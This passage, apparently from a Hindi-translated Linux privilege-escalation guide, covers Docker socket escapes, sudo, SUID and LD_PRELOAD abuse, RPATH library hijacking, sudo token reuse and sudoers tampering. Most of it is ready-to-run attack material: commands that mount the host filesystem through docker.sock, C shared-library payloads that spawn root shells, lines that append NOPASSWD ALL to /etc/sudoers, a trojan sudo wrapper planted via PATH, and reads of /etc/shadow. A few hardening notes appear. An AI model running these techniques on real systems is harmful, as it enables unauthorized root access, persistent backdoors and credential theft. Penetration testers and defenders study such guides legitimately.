_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### Unix Sockets को सूचीबद्ध करें
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests हो सकते हैं (_मैं .socket files की बात नहीं कर रहा हूँ बल्कि उन फाइलों की बात कर रहा हूँ जो unix sockets के रूप में कार्य करती हैं_)। आप इसे निम्न से जाँच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि socket **HTTP अनुरोध का उत्तर देता है**, तो आप इसके साथ **संवाद** कर सकते हैं और शायद **exploit some vulnerability**.

### लिखने योग्य Docker Socket

Docker socket, जो अक्सर `/var/run/docker.sock` पर मिलेगा, एक महत्वपूर्ण फ़ाइल है जिसे सुरक्षित रखा जाना चाहिए। डिफ़ॉल्ट रूप से, यह `root` user और `docker` group के सदस्यों द्वारा लिखने योग्य होता है। इस socket पर write access होने से privilege escalation हो सकता है। यहाँ बताया गया है कि इसे कैसे किया जा सकता है और वैकल्पिक तरीके यदि Docker CLI उपलब्ध नहीं है।

#### **Privilege Escalation with Docker CLI**

यदि आपके पास Docker socket पर write access है, तो आप निम्नलिखित commands का उपयोग करके escalate privileges कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये commands आपको होस्ट की फ़ाइल सिस्टम पर root-स्तरीय access के साथ एक container चलाने की अनुमति देती हैं।

#### **Docker API का प्रत्यक्ष उपयोग**

यदि Docker CLI उपलब्ध नहीं है, तो Docker socket को फिर भी Docker API और `curl` commands का उपयोग करके हेरफेर किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** होस्ट सिस्टम की root directory को mount करने वाला एक container बनाने का request भेजें।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

नए बनाए गए container को start करें:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** `socat` का उपयोग करके container से कनेक्शन स्थापित करें, जिससे उसके अंदर command execution संभव हो सके।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

एक बार `socat` कनेक्शन सेट हो जाने के बाद, आप होस्ट की फ़ाइल सिस्टम पर root-स्तरीय access के साथ container के अंदर सीधे commands चला सकते हैं।

### अन्य

ध्यान दें कि यदि आप docker socket पर write permissions रखते हैं क्योंकि आप **group `docker` के अंदर** हैं, तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) हैं। यदि [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

Check **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आप यह पाते हैं कि आप **`ctr`** command का उपयोग कर सकते हैं, तो निम्न पेज पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आप यह पाते हैं कि आप **`runc`** command का उपयोग कर सकते हैं, तो निम्न पेज पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक परिष्कृत inter-Process Communication (IPC) system है जो applications को प्रभावी रूप से interact करने और डेटा share करने में सक्षम बनाता है। आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया, यह विभिन्न प्रकार की application communication के लिए एक मजबूत framework प्रदान करता है।

यह system बहुमुखी है, मूल IPC को सपोर्ट करता है जो processes के बीच data एक्सचेंज को बेहतर बनाता है, और यह enhanced UNIX domain sockets की याद दिलाता है। साथ ही, यह events या signals के broadcasting में मदद करता है, जिससे system components के बीच seamless integration होता है। उदाहरण के तौर पर, आने वाली कॉल के बारे में Bluetooth daemon का एक signal संगीत player को mute करने के लिए प्रेरित कर सकता है, जिससे यूज़र अनुभव बेहतर होता है। अतिरिक्त रूप से, D-Bus एक remote object system को भी सपोर्ट करता है, जो applications के बीच service requests और method invocations को सरल बनाता है और परंपरागत रूप से जटिल प्रक्रियाओं को streamline करता है।

D-Bus एक allow/deny model पर काम करता है, जो message permissions (method calls, signal emissions, आदि) को matching policy rules के समेकित प्रभाव के आधार पर प्रबंधित करता है। ये policies bus के साथ interactions को निर्दिष्ट करती हैं, और इन permissions के exploit से संभवतः privilege escalation की अनुमति दे सकती हैं।

ऐसी एक policy का उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है, जो root user को `fi.w1.wpa_supplicant1` से messages को own करने, भेजने और प्राप्त करने के permissions का विवरण देता है।

यदि policies में कोई user या group निर्दिष्ट नहीं है तो वे सार्वभौमिक रूप से लागू होती हैं, जबकि "default" context policies उन सभी पर लागू होती हैं जो अन्य विशिष्ट policies द्वारा कवर नहीं किए गए हैं।
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**यहाँ जानें कैसे enumerate और exploit एक D-Bus communication:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Network**

यह हमेशा रोचक होता है कि enumerate the network करके मशीन की स्थिति पता करें।

### Generic enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### खुले पोर्ट

हमेशा उन नेटवर्क सेवाओं की जाँच करें जो उस मशीन पर चल रही हों और जिनके साथ आप इसे एक्सेस करने से पहले इंटरैक्ट नहीं कर पाए थे:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

जाँचें कि आप sniff traffic कर सकते हैं या नहीं। यदि आप कर सकते हैं, तो आप कुछ credentials प्राप्त कर सकते हैं।
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

जाँचें कि आप **कौन** हैं, आपके पास कौन से **privileges** हैं, सिस्टम में कौन-कौन से **users** हैं, कौन **login** कर सकता है और किनके पास **root privileges** हैं:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### बड़ा UID

कुछ Linux वर्ज़न एक बग से प्रभावित थे जो उन उपयोगकर्ताओं (जिनका **UID > INT_MAX** है) को escalate privileges करने की अनुमति देता है. अधिक जानकारी: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### समूह

जाँचें कि क्या आप किसी ऐसे **समूह के सदस्य** हैं जो आपको root privileges दे सकता है:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

यदि संभव हो तो जाँचें कि क्लिपबोर्ड के अंदर कुछ दिलचस्प है या नहीं
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### पासवर्ड नीति
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### ज्ञात पासवर्ड

यदि आप **environment का कोई भी पासवर्ड जानते हैं** तो उस पासवर्ड का उपयोग करके **प्रत्येक user के रूप में लॉगिन करने** का प्रयास करें।

### Su Brute

यदि आप बहुत शोर करने से परहेज़ नहीं करते और कंप्यूटर पर `su` और `timeout` बाइनरी मौजूद हैं, तो आप [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` पैरामीटर के साथ भी users पर brute-force करने की कोशिश करता है।

## Writable PATH का दुरुपयोग

### $PATH

यदि आपको पता चलता है कि आप **$PATH के किसी फ़ोल्डर के अंदर लिख सकते हैं** तो आप संभवतः privileges escalate कर सकते हैं by **writable फ़ोल्डर के अंदर उस command के नाम से backdoor बनाकर** जिसे किसी अन्य user (आदर्श रूप से root) द्वारा execute किया जाना है और जो **आपके writable फ़ोल्डर से पहले $PATH में स्थित किसी फ़ोल्डर से लोड नहीं होता**।

### SUDO and SUID

आपको कुछ command sudo के माध्यम से execute करने की अनुमति दी गयी हो सकती है या उन पर suid bit सेट हो सकता है। इसे चेक करने के लिए:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
कुछ **अनपेक्षित commands आपको files पढ़ने और/या लिखने या यहां तक कि कोई command execute करने की अनुमति देते हैं।** उदाहरण के लिए:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

sudo कॉन्फ़िगरेशन किसी user को बिना password जाने दूसरे user की privileges के साथ कोई command execute करने की अनुमति दे सकता है।
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
इस उदाहरण में उपयोगकर्ता `demo` `root` के रूप में `vim` चला सकता है; अब root directory में एक ssh key जोड़कर या `sh` कॉल करके shell पाना सरल है।
```
sudo vim -c '!sh'
```
### SETENV

यह निर्देश उपयोगकर्ता को किसी चीज़ को निष्पादित करते समय **set an environment variable** करने की अनुमति देता है:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
यह उदाहरण, **HTB machine Admirer पर आधारित**, **vulnerable** था **PYTHONPATH hijacking** के कारण, ताकि किसी मनमाना python library को script को root के रूप में चलाते समय लोड किया जा सके:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

यदि sudoers `BASH_ENV` को संरक्षित करता है (उदा., `Defaults env_keep+="ENV BASH_ENV"`), तो आप Bash के non-interactive स्टार्टअप व्यवहार का उपयोग करके किसी अनुमत कमांड को चलाते समय arbitrary कोड को root के रूप में चला सकते हैं।

- Why it works: non-interactive शेल्स के लिए, Bash `$BASH_ENV` का मूल्यांकन करता है और target स्क्रिप्ट चलाने से पहले उस फ़ाइल को source करता है। कई sudo नियम स्क्रिप्ट या किसी shell wrapper को चलाने की अनुमति देते हैं। अगर sudo द्वारा `BASH_ENV` संरक्षित है, तो आपकी फाइल root privileges के साथ source की जाती है।

- Requirements:
- आप चला सके ऐसा एक sudo नियम (कोई भी target जो `/bin/bash` को non-interactively invoke करता है, या कोई भी bash स्क्रिप्ट)।
- `BASH_ENV` `env_keep` में मौजूद हो (जाँच करने के लिए `sudo -l`)।

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- हार्डनिंग:
- हटाएँ `BASH_ENV` (और `ENV`) को `env_keep` से, `env_reset` को प्राथमिकता दें।
- sudo-allowed commands के लिए shell wrappers से बचें; minimal binaries का उपयोग करें।
- जब preserved env vars इस्तेमाल हों तो sudo I/O logging और alerting पर विचार करें।

### Sudo execution को बायपास करने वाले paths

**Jump** करके अन्य फाइलें पढ़ें या **symlinks** का उपयोग करें। उदाहरण के लिए sudoers फ़ाइल में: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
यदि एक **wildcard** उपयोग किया जाता है (\*), तो यह और भी आसान है:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**निवारक उपाय**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

यदि **sudo permission** किसी एक command को **path निर्दिष्ट किए बिना** दिया गया है: _hacker10 ALL= (root) less_ तो आप इसे PATH variable बदलकर exploit कर सकते हैं।
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
यह तकनीक तब भी इस्तेमाल की जा सकती है अगर एक **suid** बाइनरी **किसी अन्य कमांड को बिना पथ निर्दिष्ट किए निष्पादित करती है (हमेशा किसी अजीब SUID बाइनरी की सामग्री को** _**strings**_ **से जांचें)**।

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

यदि **suid** बाइनरी **पथ निर्दिष्ट करते हुए किसी अन्य कमांड को निष्पादित करती है**, तो आप उस कमांड के नाम से एक फ़ंक्शन **export a function** करने की कोशिश कर सकते हैं जिसे suid फ़ाइल कॉल कर रही है।

उदाहरण के लिए, अगर एक suid बाइनरी _**/usr/sbin/service apache2 start**_ कॉल करती है, तो आपको फ़ंक्शन बनाने और उसे export करने की कोशिश करनी चाहिए:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
फिर, जब आप suid बाइनरी को कॉल करेंगे, यह फ़ंक्शन निष्पादित होगा।

### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable का उपयोग loader को एक या अधिक shared libraries (.so files) निर्दिष्ट करने के लिए किया जाता है, जिन्हें loader अन्य सभी लाइब्रेरीज़ के पहले लोड करता है, जिनमें standard C library (`libc.so`) भी शामिल है। इस प्रक्रिया को library का preloading कहा जाता है।

हालाँकि, सिस्टम सुरक्षा बनाए रखने और इस विशेषता का दुरुपयोग होने से रोकने के लिए, विशेषकर **suid/sgid** executables के साथ, सिस्टम कुछ शर्तें लागू करता है:

- जहां real user ID (_ruid_) effective user ID (_euid_) से मेल नहीं खाती, उन executables के लिए loader **LD_PRELOAD** की उपेक्षा करता है।
- suid/sgid वाले executables के लिए, केवल standard paths में मौजूद और जो स्वयं suid/sgid हों, वही libraries preload की जाती हैं।

Privilege escalation हो सकती है यदि आपके पास `sudo` के साथ commands execute करने की क्षमता है और `sudo -l` के आउटपुट में **env_keep+=LD_PRELOAD** शामिल है। यह कॉन्फ़िगरेशन `sudo` के साथ कमांड चलाते समय भी **LD_PRELOAD** environment variable को बरकरार और मान्यता प्राप्त होने की अनुमति देता है, जो संभवतः elevated privileges के साथ arbitrary code के निष्पादन की ओर ले जा सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
इसे **/tmp/pe.c** के रूप में सहेजें
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
फिर **इसे compile करें** का उपयोग करके:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंत में, **escalate privileges** चलाकर
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc का दुरुपयोग तब किया जा सकता है यदि हमलावर **LD_LIBRARY_PATH** env variable को नियंत्रित करता है, क्योंकि वह उन पाथों को नियंत्रित करता है जहाँ लाइब्रेरीज़ खोजी जाएँगी।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब किसी असामान्य दिखने वाले binary पर **SUID** permissions मिलें, तो यह एक अच्छा अभ्यास है कि आप जांचें कि वह **.so** फ़ाइलें सही तरीके से लोड कर रहा है या नहीं। इसे निम्नलिखित कमांड चलाकर जांचा जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिये, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि का सामना करना संभावित exploitation का संकेत देता है।

इसे exploit करने के लिए, आप एक C फ़ाइल बनाकर आगे बढ़ेंगे, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह कोड, एक बार compiled और executed होने पर, file permissions को manipulate करके और elevated privileges के साथ shell execute करके privileges बढ़ाने का प्रयास करता है।

ऊपर के C फ़ाइल को निम्न कमांड से एक shared object (.so) फ़ाइल में compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID बाइनरी चलाने से exploit ट्रिगर होना चाहिए, जिससे संभावित system compromise हो सकता है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो उस फोल्डर से एक library लोड कर रहा है जिसमें हम लिख सकते हैं, तो चलिए उस फोल्डर में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको निम्नलिखित जैसी त्रुटि मिलती है
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) एक curated list है Unix binaries का जिन्हें एक attacker local security restrictions को bypass करने के लिए exploit कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) भी ऐसा ही है लेकिन उन मामलों के लिए जहाँ आप किसी command में **केवल arguments inject** कर सकते हैं।

यह project Unix binaries के legit functions को इकट्ठा करता है जिन्हें restricted shells से बाहर निकलने, privileges escalate या maintain करने, files transfer करने, bind और reverse shells spawn करने, और अन्य post-exploitation tasks को आसान बनाने के लिए abuse किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

यदि आप `sudo -l` तक पहुँच सकते हैं तो आप tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग यह जांचने के लिए कर सकते हैं कि यह किसी भी sudo rule को exploit करने का तरीका ढूँढता है या नहीं।

### Reusing Sudo Tokens

ऐसे मामलों में जहाँ आपके पास `sudo` access है लेकिन password नहीं है, आप privileges escalate कर सकते हैं जब आप किसी sudo command के execution का इंतज़ार करके session token को hijack कर लेते हैं।

privileges बढ़ाने के लिए आवश्यकताएँ:

- आपके पास पहले से user "_sampleuser_" के रूप में एक shell होना चाहिए
- "_sampleuser_" ने **पिछले 15 मिनटों** में कुछ execute करने के लिए **`sudo` का उपयोग किया** होना चाहिए (डिफ़ॉल्ट रूप से यही sudo token की अवधि होती है जो हमें किसी password के बिना `sudo` उपयोग करने की अनुमति देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 होना चाहिए
- `gdb` उपलब्ध होना चाहिए (आप इसे upload करने में सक्षम हो सकते हैं)

(आप अस्थायी रूप से `ptrace_scope` को सक्षम कर सकते हैं `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` के साथ या स्थायी रूप से `/etc/sysctl.d/10-ptrace.conf` modify करके और `kernel.yama.ptrace_scope = 0` सेट करके)

यदि ये सभी आवश्यकताएँ पूरी होती हैं, तो आप इसका उपयोग करके privileges escalate कर सकते हैं: [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- यह **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root के स्वामित्व वाला और setuid के साथ** होगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **तीसरा exploit** (`exploit_v3.sh`) **sudoers file बनाएगा** जो **sudo tokens को स्थायी बना देगा और सभी उपयोगकर्ताओं को sudo का उपयोग करने की अनुमति देगा**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास उस फ़ोल्डर में या फ़ोल्डर के अंदर बनी किसी भी फ़ाइल पर **write permissions** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **create a sudo token for a user and PID** कर सकते हैं.\\  
उदाहरण के लिए, अगर आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और उस user के रूप में आपके पास PID 1234 के साथ एक shell है, तो आप पासवर्ड जाने बिना **obtain sudo privileges** कर सकते हैं, करने के लिए:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह निर्धारित करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे।  
**डिफ़ॉल्ट रूप से ये फ़ाइलें केवल user root और group root द्वारा ही पढ़ी जा सकती हैं**.\
**यदि** आप इस फ़ाइल को **पढ़** सकते हैं तो आप कुछ रोचक जानकारी **प्राप्त** कर सकते हैं, और अगर आप किसी भी फ़ाइल को **लिख** सकते हैं तो आप **escalate privileges** कर पाएंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं, तो आप इस अनुमति का दुरुपयोग कर सकते हैं।
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

कुछ विकल्प मौजूद हैं `sudo` बाइनरी के, जैसे OpenBSD के लिए `doas`; इसकी कॉन्फ़िगरेशन को `/etc/doas.conf` पर जांचना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि एक **user आमतौर पर किसी मशीन से कनेक्ट करता है और privileges बढ़ाने के लिए `sudo` का उपयोग करता है** और आपको उस user context में shell मिल गया है, तो आप **एक नया sudo executable बना सकते हैं** जो सबसे पहले आपके कोड को root के रूप में चलाएगा और उसके बाद user का कमांड चलाएगा। फिर, user context का **$PATH** बदलें (उदाहरण के लिए नया path `.bash_profile` में जोड़कर) ताकि जब user `sudo` चलाए तो आपका sudo executable executed हो।

ध्यान दें कि अगर user कोई अलग shell (bash नहीं) उपयोग कर रहा है तो आपको नया path जोड़ने के लिए अन्य फाइलें संशोधित करनी होंगी। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में पा सकते हैं।

या कुछ इस तरह चलाना:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

फ़ाइल `/etc/ld.so.conf` बताती है **कि लोड की जाने वाली configuration फ़ाइलें कहाँ से आ रही हैं**। आम तौर पर, इस फ़ाइल में निम्न पाथ होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फ़ाइलें पढ़ी जाएँगी। ये कॉन्फ़िगरेशन फ़ाइलें **अन्य फ़ोल्डरों की ओर इशारा करती हैं** जहाँ **लाइब्रेरियाँ** **खोजी** जाएँगी। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **इसका मतलब है कि सिस्टम `/usr/local/lib` के अंदर लाइब्रेरियों की खोज करेगा।**

यदि किसी कारणवश **a user has write permissions** निर्देशित किसी भी पथ पर हों: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई फ़ाइल या `/etc/ld.so.conf.d/*.conf` के भीतर config फ़ाइल द्वारा इंगित कोई भी फ़ोल्डर, तो वह escalate privileges कर सकता है.\
Take a look at **how to exploit this misconfiguration** in the following page:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर यह `RPATH` वेरिएबल में निर्दिष्ट इस स्थान पर प्रोग्राम द्वारा उपयोग किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` का उपयोग करके एक दुष्ट लाइब्रेरी बनाएं।
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## क्षमताएँ

Linux capabilities किसी process को उपलब्ध root privileges का **एक उपसमूह प्रदान करती हैं**। यह प्रभावी रूप से root के **privileges को छोटे और विशिष्ट यूनिट्स में विभाजित कर देता है**। इन यूनिट्स में से प्रत्येक फिर प्रक्रियाओं को स्वतंत्र रूप से दिया जा सकता है। इस तरह पूरे privileges का सेट कम हो जाता है, जिससे exploitation के जोखिम घटते हैं।\
निम्न पृष्ठ पढ़ें ताकि आप **capabilities और उन्हें कैसे abuse किया जा सकता है** इस बारे में और जान सकें:


